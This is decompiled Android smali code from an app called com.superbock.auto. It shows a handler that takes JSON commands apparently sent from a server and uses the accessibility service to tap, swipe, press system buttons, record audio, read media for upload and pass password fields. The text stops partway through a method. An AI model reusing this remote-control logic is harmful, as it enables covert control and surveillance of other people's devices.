.class public final Lf3/i$a;
.super Ld1/f;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lf3/i;->c(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# instance fields
.field public b:Ljava/util/Timer;

.field public c:J

.field public d:J

.field public e:J

.field public f:Lf3/l;

.field public final synthetic g:Ljava/lang/String;

.field public final synthetic h:Landroid/content/Context;

.field public final synthetic i:F

.field public final synthetic j:F

.field public final synthetic k:F

.field public final synthetic l:F

.field public final synthetic m:F

.field public final synthetic n:F

.field public final synthetic o:F

.field public final synthetic p:F

.field public final synthetic q:I

.field public final synthetic r:I


# direct methods
.method public constructor <init>(Ljava/lang/String;Landroid/content/Context;FFFFFFFFII)V
    .locals 0

    iput-object p1, p0, Lf3/i$a;->g:Ljava/lang/String;

    iput-object p2, p0, Lf3/i$a;->h:Landroid/content/Context;

    iput p3, p0, Lf3/i$a;->i:F

    iput p4, p0, Lf3/i$a;->j:F

    iput p5, p0, Lf3/i$a;->k:F

    iput p6, p0, Lf3/i$a;->l:F

    iput p7, p0, Lf3/i$a;->m:F

    iput p8, p0, Lf3/i$a;->n:F

    iput p9, p0, Lf3/i$a;->o:F

    iput p10, p0, Lf3/i$a;->p:F

    iput p11, p0, Lf3/i$a;->q:I

    iput p12, p0, Lf3/i$a;->r:I

    invoke-direct {p0}, Ld1/f;-><init>()V

    return-void
.end method


# virtual methods
.method public final D(I)V
    .locals 3

    const/16 v0, 0x3e8

    if-ne p1, v0, :cond_0

    invoke-static {}, Lcom/blankj/utilcode/util/SPUtils;->getInstance()Lcom/blankj/utilcode/util/SPUtils;

    move-result-object p1

    const-wide/16 v0, 0x0

    const-string v2, "lastCtrlTime"

    invoke-virtual {p1, v2, v0, v1}, Lcom/blankj/utilcode/util/SPUtils;->put(Ljava/lang/String;J)V

    const/4 p1, 0x0

    sput p1, Lf3/i;->f:I

    :cond_0
    invoke-virtual {p0}, Lf3/i$a;->X()V

    return-void
.end method

.method public final E()V
    .locals 0

    return-void
.end method

.method public final F()V
    .locals 4

    invoke-virtual {p0}, Lf3/i$a;->X()V

    sget v0, Lf3/i;->f:I

    add-int/lit8 v1, v0, 0x1

    sput v1, Lf3/i;->f:I

    const/4 v1, 0x3

    if-ge v0, v1, :cond_0

    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lf3/h;

    invoke-direct {v1, p0}, Lf3/h;-><init>(Lf3/i$a;)V

    const-wide/16 v2, 0x1388

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    :cond_0
    return-void
.end method

.method public final G()V
    .locals 4

    invoke-static {}, Lcom/blankj/utilcode/util/SPUtils;->getInstance()Lcom/blankj/utilcode/util/SPUtils;

    move-result-object v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-string v3, "lastCtrlTime"

    invoke-virtual {v0, v3, v1, v2}, Lcom/blankj/utilcode/util/SPUtils;->put(Ljava/lang/String;J)V

    return-void
.end method

.method public final H(Ls3/g0;Ljava/lang/String;)V
    .locals 16
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param
    .param p2    # Ljava/lang/String;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    move-object/from16 v9, p0

    move-object/from16 v0, p1

    invoke-static {}, Lcom/blankj/utilcode/util/SPUtils;->getInstance()Lcom/blankj/utilcode/util/SPUtils;

    move-result-object v1

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-string v4, "lastCtrlTime"

    invoke-virtual {v1, v4, v2, v3}, Lcom/blankj/utilcode/util/SPUtils;->put(Ljava/lang/String;J)V

    const-string v1, "ping"

    move-object/from16 v2, p2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, v9, Lf3/i$a;->d:J

    return-void

    :cond_0
    invoke-static/range {p2 .. p2}, Lf/a;->u(Ljava/lang/String;)Lf/e;

    move-result-object v1

    if-eqz v1, :cond_e

    const-string v2, "code"

    invoke-virtual {v1, v2}, Lf/e;->containsKey(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_e

    invoke-virtual {v1, v2}, Lf/e;->z(Ljava/lang/String;)I

    move-result v2

    const/16 v3, 0x7d0

    if-lt v2, v3, :cond_1

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    iput-wide v3, v9, Lf3/i$a;->d:J

    :cond_1
    const-wide/16 v3, 0x0

    const-string v5, "startY"

    const-string v6, "startX"

    const/4 v7, 0x4

    const/4 v8, 0x3

    const-string v10, "times"

    const/4 v11, 0x0

    const-string v12, "type"

    const/4 v13, 0x1

    const/4 v14, 0x2

    packed-switch v2, :pswitch_data_0

    const-string v3, "on"

    const/4 v4, 0x0

    packed-switch v2, :pswitch_data_1

    const-string v5, "value"

    packed-switch v2, :pswitch_data_2

    packed-switch v2, :pswitch_data_3

    const-string v3, "num"

    const-string v4, "pkg"

    const-string v6, "ty"

    const-string v7, "na"

    const-string v8, "pk"

    const-string v15, "pageSize"

    const-string v14, "pageNum"

    packed-switch v2, :pswitch_data_4

    packed-switch v2, :pswitch_data_5

    goto/16 :goto_7

    :pswitch_0
    :try_start_0
    invoke-virtual/range {p0 .. p1}, Lf3/i$a;->o0(Ls3/g0;)V

    goto/16 :goto_7

    :pswitch_1
    invoke-virtual {v1, v12}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v1, v10}, Lf/e;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    invoke-static {v1}, Lm/j;->n(Ljava/lang/Object;)Ljava/lang/Long;

    move-result-object v1

    if-nez v1, :cond_2

    goto :goto_0

    :cond_2
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    :goto_0
    const-wide/16 v1, 0xc8

    if-eqz v0, :cond_5

    if-eq v0, v13, :cond_3

    goto/16 :goto_7

    :cond_3
    cmp-long v0, v3, v1

    if-gez v0, :cond_4

    move-wide v3, v1

    :cond_4
    sput-wide v3, Lf3/i;->i:J

    goto/16 :goto_7

    :cond_5
    cmp-long v0, v3, v1

    if-gez v0, :cond_6

    move-wide v3, v1

    :cond_6
    sput-wide v3, Lf3/i;->g:J

    goto/16 :goto_7

    :pswitch_2
    invoke-virtual {v1, v6}, Lf/e;->y(Ljava/lang/String;)F

    move-result v0

    invoke-virtual {v1, v5}, Lf/e;->y(Ljava/lang/String;)F

    move-result v2

    invoke-virtual {v1, v10}, Lf/e;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    invoke-static {v1}, Lm/j;->n(Ljava/lang/Object;)Ljava/lang/Long;

    move-result-object v1

    if-nez v1, :cond_7

    goto :goto_1

    :cond_7
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    :goto_1
    const-wide/16 v5, 0x3e8

    cmp-long v1, v3, v5

    if-gez v1, :cond_8

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1, v0, v2}, Lcom/superbock/auto/BaseService;->m(FF)V

    goto/16 :goto_7

    :cond_8
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v1

    invoke-virtual {v1, v0, v2, v3, v4}, Lcom/superbock/auto/BaseService;->p(FFJ)V

    goto/16 :goto_7

    :pswitch_3
    invoke-virtual {v1, v6}, Lf/e;->y(Ljava/lang/String;)F

    move-result v0

    invoke-virtual {v1, v5}, Lf/e;->y(Ljava/lang/String;)F

    move-result v2

    const-string v3, "offsetX"

    invoke-virtual {v1, v3}, Lf/e;->y(Ljava/lang/String;)F

    move-result v3

    const-string v4, "offsetY"

    invoke-virtual {v1, v4}, Lf/e;->y(Ljava/lang/String;)F

    move-result v1

    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v4

    invoke-virtual {v4, v0, v2, v3, v1}, Lcom/superbock/auto/BaseService;->q(FFFF)V

    goto/16 :goto_7

    :pswitch_4
    invoke-virtual {v9, v7}, Lf3/i$a;->m0(I)V

    goto/16 :goto_7

    :pswitch_5
    invoke-virtual {v9, v8}, Lf3/i$a;->m0(I)V

    goto/16 :goto_7

    :pswitch_6
    invoke-virtual {v9, v14}, Lf3/i$a;->m0(I)V

    goto/16 :goto_7

    :pswitch_7
    invoke-virtual {v9, v13}, Lf3/i$a;->m0(I)V

    goto/16 :goto_7

    :pswitch_8
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    invoke-virtual {v0, v13}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7

    :pswitch_9
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    invoke-virtual {v0, v14}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7

    :pswitch_a
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    invoke-virtual {v0, v8}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7

    :pswitch_b
    invoke-virtual/range {p0 .. p1}, Lf3/i$a;->l0(Ls3/g0;)V

    goto/16 :goto_7

    :catchall_0
    move-exception v0

    goto/16 :goto_4

    :catch_0
    move-exception v0

    const/4 v3, 0x2

    goto/16 :goto_5

    :pswitch_c
    invoke-virtual {v1, v3}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v9, v0}, Lf3/i$a;->c0(I)V

    goto/16 :goto_7

    :pswitch_d
    invoke-virtual {v1, v3}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    if-nez v0, :cond_9

    sget-boolean v0, Lcom/superbock/auto/BaseService;->B:Z

    const/4 v13, 0x0

    if-nez v0, :cond_a

    goto :goto_2

    :cond_9
    if-ne v0, v13, :cond_e

    sget-boolean v0, Lcom/superbock/auto/BaseService;->B:Z

    if-eqz v0, :cond_a

    :goto_2
    invoke-static {v13}, Lf3/i;->g(Z)V

    goto/16 :goto_7

    :cond_a
    sput-boolean v13, Lcom/superbock/auto/BaseService;->B:Z

    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/superbock/auto/BaseService;->C:Ljava/lang/Boolean;

    invoke-static {}, Lf3/i;->o()V

    goto/16 :goto_7

    :pswitch_e
    invoke-virtual {v1, v3}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    const-string v2, "img"

    invoke-virtual {v1, v2}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v0, v1}, Lf3/i$a;->Q(ILjava/lang/String;)V

    goto/16 :goto_7

    :pswitch_f
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    const/4 v1, 0x5

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7

    :pswitch_10
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    invoke-virtual {v0, v7}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7

    :pswitch_11
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    const/16 v1, 0x8

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7

    :pswitch_12
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sput-wide v0, Lcom/superbock/auto/BaseService;->D:J

    const-string v0, "37"

    invoke-static {v4, v0, v11}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_13
    invoke-virtual {v1, v3}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v9, v0}, Lf3/i$a;->Y(I)V

    goto/16 :goto_7

    :pswitch_14
    invoke-virtual {v1, v5}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v9, v0}, Lf3/i$a;->f0(Ljava/lang/String;)Z

    goto/16 :goto_7

    :pswitch_15
    invoke-virtual {v1, v5}, Lf/e;->z(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v9, v0, v1}, Lf3/i$a;->R(Ls3/g0;I)V

    goto/16 :goto_7

    :pswitch_16
    invoke-virtual/range {p0 .. p0}, Lf3/i$a;->q0()V

    goto/16 :goto_7

    :pswitch_17
    invoke-virtual/range {p0 .. p0}, Lf3/i$a;->r0()V

    goto/16 :goto_7

    :pswitch_18
    const-string v0, "stillOpen"

    invoke-virtual {v1, v0}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    if-ne v0, v13, :cond_b

    goto :goto_3

    :cond_b
    const/4 v13, 0x0

    :goto_3
    invoke-virtual {v9, v13}, Lf3/i$a;->U(Z)V

    goto/16 :goto_7

    :pswitch_19
    iget-object v0, v9, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/a;->k(Landroid/content/Context;)V

    const-string v0, "45"

    invoke-static {v4, v0, v11}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_1a
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    move-result-object v0

    const/4 v1, 0x6

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto/16 :goto_7

    :pswitch_1b
    invoke-virtual {v1, v14}, Lf/e;->z(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v1, v15}, Lf/e;->z(Ljava/lang/String;)I

    move-result v3

    const-string v4, "st"

    invoke-virtual {v1, v4}, Lf/e;->z(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v9, v0, v2, v3, v1}, Lf3/i$a;->P(Ls3/g0;III)V

    goto/16 :goto_7

    :pswitch_1c
    invoke-virtual {v1, v14}, Lf/e;->z(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v1, v15}, Lf/e;->z(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v1, v6}, Lf/e;->z(Ljava/lang/String;)I

    move-result v5

    invoke-virtual {v1, v8}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v7}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    invoke-virtual/range {v1 .. v7}, Lf3/i$a;->e0(Ls3/g0;IIILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_1d
    invoke-virtual {v1, v14}, Lf/e;->z(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v1, v15}, Lf/e;->z(Ljava/lang/String;)I

    move-result v4

    const-string v2, "et"

    invoke-virtual {v1, v2}, Lf/e;->z(Ljava/lang/String;)I

    move-result v5

    const-string v2, "pa"

    invoke-virtual {v1, v2}, Lf/e;->z(Ljava/lang/String;)I

    move-result v6

    invoke-virtual {v1, v8}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    move-object v7, v8

    move-object v8, v10

    invoke-virtual/range {v1 .. v8}, Lf3/i$a;->a0(Ls3/g0;IIIILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_1e
    invoke-static {}, Lcom/superbock/auto/BaseService;->g()Lcom/superbock/auto/BaseService;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    sput-wide v0, Lf3/i;->d:J

    goto/16 :goto_7

    :pswitch_1f
    invoke-virtual {v1, v12}, Lf/e;->z(Ljava/lang/String;)I

    move-result v2

    const-string v3, "item"

    invoke-virtual {v1, v3}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v0, v2, v1}, Lf3/i$a;->g0(Ls3/g0;ILjava/lang/String;)V

    goto/16 :goto_7

    :pswitch_20
    invoke-virtual {v1, v12}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v1, v4}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v0, v1}, Lf3/i$a;->N(ILjava/lang/String;)V

    goto/16 :goto_7

    :pswitch_21
    invoke-virtual {v1, v12}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v1, v3}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v0, v1}, Lf3/i$a;->S(ILjava/lang/String;)V

    goto/16 :goto_7

    :pswitch_22
    invoke-virtual/range {p0 .. p0}, Lf3/i$a;->V()V

    goto/16 :goto_7

    :pswitch_23
    invoke-virtual {v1, v12}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {v1, v3}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v5}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v0, v2, v1}, Lf3/i$a;->n0(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_24
    invoke-virtual/range {p0 .. p0}, Lf3/i$a;->b0()V

    goto/16 :goto_7

    :pswitch_25
    invoke-virtual/range {p0 .. p0}, Lf3/i$a;->M()V

    goto/16 :goto_7

    :pswitch_26
    const-string v0, "path"

    invoke-virtual {v1, v0}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ld1/d;->k(Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_27
    iget-object v0, v9, Lf3/i$a;->h:Landroid/content/Context;

    const-string v2, "android.permission.RECORD_AUDIO"

    invoke-static {v0, v2}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_c

    const-string v0, "38"

    invoke-static {v13, v0, v11}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :cond_c
    iget-object v0, v9, Lf3/i$a;->h:Landroid/content/Context;

    invoke-virtual {v1, v10}, Lf/e;->z(Ljava/lang/String;)I

    move-result v1

    invoke-static {v0, v1}, Lf3/m;->a(Landroid/content/Context;I)V

    goto/16 :goto_7

    :pswitch_28
    invoke-virtual {v1, v12}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    const-string v2, "id"

    invoke-virtual {v1, v2}, Lf/e;->z(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v9, v0, v1}, Lf3/i$a;->T(II)V

    goto/16 :goto_7

    :pswitch_29
    iget-object v0, v9, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0}, Lk3/f;->s(Landroid/content/Context;)V

    goto/16 :goto_7

    :pswitch_2a
    invoke-virtual {v1, v14}, Lf/e;->z(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v1, v15}, Lf/e;->z(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v1, v6}, Lf/e;->z(Ljava/lang/String;)I

    move-result v5

    invoke-virtual {v1, v8}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v7}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    invoke-virtual/range {v1 .. v7}, Lf3/i$a;->j0(Ls3/g0;IIILjava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_2b
    invoke-virtual {v1, v14}, Lf/e;->z(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v1, v15}, Lf/e;->z(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v1, v6}, Lf/e;->z(Ljava/lang/String;)I

    move-result v5

    const-string v2, "js"

    invoke-virtual {v1, v2}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v8}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v1, v7}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    move-object v7, v8

    move-object v8, v10

    invoke-virtual/range {v1 .. v8}, Lf3/i$a;->d0(Ls3/g0;IIILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_7

    :pswitch_2c
    invoke-virtual {v1, v4}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "customId"

    invoke-virtual {v1, v2}, Lf/e;->z(Ljava/lang/String;)I

    move-result v2

    const-string v3, "confirm"

    invoke-virtual {v1, v3}, Lf/e;->z(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v9, v0, v2, v1}, Lf3/i$a;->i0(Ljava/lang/String;II)V

    goto :goto_7

    :pswitch_2d
    const-string v0, "adInfo"

    invoke-virtual {v1, v0}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v9, v0}, Lf3/i$a;->h0(Ljava/lang/String;)V

    goto :goto_7

    :pswitch_2e
    invoke-virtual {v1, v6}, Lf/e;->z(Ljava/lang/String;)I

    move-result v0

    const-string v2, "pw"

    invoke-virtual {v1, v2}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "pw2"

    invoke-virtual {v1, v3}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v0, v2, v1}, Lf3/i$a;->W(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_7

    :pswitch_2f
    invoke-virtual {v1, v14}, Lf/e;->z(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v1, v15}, Lf/e;->z(Ljava/lang/String;)I

    move-result v4

    invoke-virtual {v1, v8}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v1, v7}, Lf/e;->B(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    move-object/from16 v1, p0

    move-object/from16 v2, p1

    invoke-virtual/range {v1 .. v6}, Lf3/i$a;->O(Ls3/g0;IILjava/lang/String;Ljava/lang/String;)V

    goto :goto_7

    :pswitch_30
    invoke-virtual {v1, v14}, Lf/e;->z(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v1, v15}, Lf/e;->z(Ljava/lang/String;)I

    move-result v3

    const-string v4, "ac"

    invoke-virtual {v1, v4}, Lf/e;->z(Ljava/lang/String;)I

    move-result v1

    invoke-virtual {v9, v0, v2, v3, v1}, Lf3/i$a;->k0(Ls3/g0;III)V
    :try_end_0
    .catch Lf3/f; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_7

    :goto_4
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v1

    const-string v2, "0"

    const/4 v3, 0x2

    invoke-static {v3, v2, v1}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_6

    :goto_5
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v2

    if-eqz v2, :cond_d

    invoke-virtual {v0}, Ljava/lang/Throwable;->getCause()Ljava/lang/Throwable;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v11

    :cond_d
    invoke-static {v3, v1, v11}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    :goto_6
    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_e
    :goto_7
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x834
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :pswitch_data_1
    .packed-switch 0x899
        :pswitch_e
        :pswitch_d
        :pswitch_c
    .end packed-switch

    :pswitch_data_2
    .packed-switch 0x89d
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
    .end packed-switch

    :pswitch_data_3
    .packed-switch 0x8a7
        :pswitch_1a
        :pswitch_19
        :pswitch_18
    .end packed-switch

    :pswitch_data_4
    .packed-switch 0x8fd
        :pswitch_28
        :pswitch_27
        :pswitch_26
        :pswitch_25
        :pswitch_24
        :pswitch_23
        :pswitch_22
        :pswitch_21
        :pswitch_20
        :pswitch_1f
        :pswitch_1e
        :pswitch_1d
        :pswitch_1c
        :pswitch_1b
    .end packed-switch

    :pswitch_data_5
    .packed-switch 0x90c
        :pswitch_30
        :pswitch_2f
        :pswitch_2e
        :pswitch_2d
        :pswitch_2c
        :pswitch_2b
        :pswitch_2a
        :pswitch_29
    .end packed-switch
.end method

.method public final I(Ls3/g0;)V
    .locals 7
    .param p1    # Ls3/g0;
        .annotation build Landroidx/annotation/NonNull;
        .end annotation
    .end param

    invoke-static {}, Lcom/blankj/utilcode/util/SPUtils;->getInstance()Lcom/blankj/utilcode/util/SPUtils;

    move-result-object v0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-string v3, "lastCtrlTime"

    invoke-virtual {v0, v3, v1, v2}, Lcom/blankj/utilcode/util/SPUtils;->put(Ljava/lang/String;J)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iput-wide v0, p0, Lf3/i$a;->c:J

    iget-object v0, p0, Lf3/i$a;->g:Ljava/lang/String;

    invoke-static {v0}, Lf3/i;->p(Ljava/lang/String;)V

    invoke-virtual {p0, p1}, Lf3/i$a;->l0(Ls3/g0;)V

    new-instance v1, Ljava/util/Timer;

    invoke-direct {v1}, Ljava/util/Timer;-><init>()V

    iput-object v1, p0, Lf3/i$a;->b:Ljava/util/Timer;

    new-instance v2, Lf3/g;

    invoke-direct {v2, p0, p1}, Lf3/g;-><init>(Lf3/i$a;Ls3/g0;)V

    const-wide/16 v3, 0x2710

    const-wide/16 v5, 0x2710

    invoke-virtual/range {v1 .. v6}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;JJ)V

    return-void
.end method

.method public final M()V
    .locals 8

    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const-string v1, "38"

    const/4 v2, 0x0

    const/4 v3, 0x1

    const/16 v4, 0x20

    if-le v0, v4, :cond_0

    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v4, "android.permission.READ_MEDIA_IMAGES"

    invoke-static {v0, v4}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {v3, v1, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    const-string v4, "android.permission.READ_EXTERNAL_STORAGE"

    invoke-static {v0, v4}, Landroidx/core/content/ContextCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v0

    if-eqz v0, :cond_1

    invoke-static {v3, v1, v2}, Lf3/i;->n(ILjava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_1
    iget-object v0, p0, Lf3/i$a;->h:Landroid/content/Context;

    invoke-static {v0, v3}, Lk3/f;->i(Landroid/content/Context;Z)V

    invoke-static {}, Lg3/f;->a()Lg3/f;

    move-result-object v0

    invoke-static {v0}, Ljava/util/Objects;->requireNonNull(Ljava/lang/Object;)Ljava/lang/Object;

    const-wide/16 v4, 0x0

    const/4 v1, 0x0

    :try_start_0
    iget-object v0, v0, Lg3/f;->a:Lt2/g;

    invoke-interface {v0}, Lt2/g;->c()Lz2/h;

    move-result-object v6

    iput-boolean v3, v6, Lz2/h;->l:Z

    invoke-virtual {v6}, Lz2/k;->g()Lz2/m;

    move-result-object v3

    const-string v6, "up2"

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    invoke-virtual {v3, v6, v7}, Lz2/m;->c(Ljava/lang/String;Ljava/lang/Object;)Lz2/m;

